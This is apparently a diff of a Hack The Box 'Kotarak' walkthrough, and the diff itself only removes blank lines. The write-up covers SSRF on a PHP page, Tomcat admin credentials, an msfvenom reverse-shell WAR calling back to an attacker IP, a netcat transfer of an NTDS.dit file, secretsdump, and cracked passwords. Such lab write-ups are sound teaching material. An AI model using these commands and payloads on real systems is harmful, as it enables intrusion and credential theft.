@@ -126,9 +126,7 @@ Trying `gobuster` on this port yields some positive results.
 Clicking on the links on the left is fruitless, but I type 'users' into the text-bar and get a blank screen, the url however suggests that the server is running php, and may be vulnerable to a directory-traversal, remote-file-inclusion, or local-file-inclusion.
 
 ```
-
 http://kotarak.htb:60000/url.php?path=users
-
 ```
 
 Initial attempts to traverse to /etc/passwd, to include reverse-shells, and webshells all fail however.
@@ -179,9 +177,7 @@ We can fuzz the port numbers, and test for responses.
 I create a list of numbers to use with the fuzzer:
 
 ```
-
 for i in $(seq 1 60000);do echo $i >> numbers.txt;done
-
 ```
 
 <hr width="250" size="6">
@@ -232,9 +228,7 @@ I need to approach it using the ssrf url, like this...
 I get page content, then download the file with wget.
 
 ```
-
 wget http://kotarak.htb:60000/url.php?path=http://localhost:888?doc=tetris.c
-
 ```
 
 I'm not a massive fan, so I don't compile it to play, instead I try out the other links.
@@ -249,9 +243,7 @@ Next is 'backup', the page turns up blank, but checking the page-source there is
 <h3>BINGO !!!</h3>
 
 ```
-
 username="admin" password="3@g01PdhB!"
-
 ```
 
 <hr width="250" size="6">
@@ -276,13 +268,11 @@ And we are greeted with the familiar tomcat dashboard.
 First lets create an evil war file to upload, then execute.
 
 ```
-
 msfvenom -p java/shell_reverse_tcp lhost=10.10.14.14 lport=6969 -f war -o evil.war
 
 Payload size: 13398 bytes
 Final size of war file: 13398 bytes
 Saved as: evil.war
-
 ```
 
 
@@ -345,19 +335,15 @@ This looks like data collected on a penetration test, using `Impacket's psexec`.
 On Kali I do:
 
 ```
-
 nc -nlvp 999 > 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
 listening on [any] 999 ...
-
 ```
 
 
 On the target I do:
 
 ```
-
 nc -nv 10.10.14.14 999 nc -nlvp 999 < 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
-
 ```
 
 Execute the listener first.
@@ -376,9 +362,7 @@ First I rename the `.bin` file as 'SYSTEM', and the `.dit` file as 'ntds.dit', w
 Extract the information with the command:
 
 ```
-
 python /opt/impacket/examples/secretsdump.py -system /root/HTB/retired/kotarak/SYSTEM -ntds /root/HTB/retired/kotarak/ntds.dit LOCAL
-
 ```
 
 This works, and the output follows...
@@ -444,10 +428,8 @@ I can use `john` or `hashcat` to crack these ntlm hashes, or save time with [cra
 They are cracked almost instantly!
 
 ```
-
 Administrator:f16tomcat!
 atanas:Password123!
-
 ```
 
 
@@ -459,10 +441,8 @@ To get atanas' shell, we can either do `ssh atanas@localhost`, or just `su atana
 Now we can grab the user.txt flag...
 
 ```
-
 atanas@kotarak-dmz:~$ cat user.txt
 93xxxxxxxxxxxxxxxxxxxxxxxxxxxxe8
-
 ```
 
 
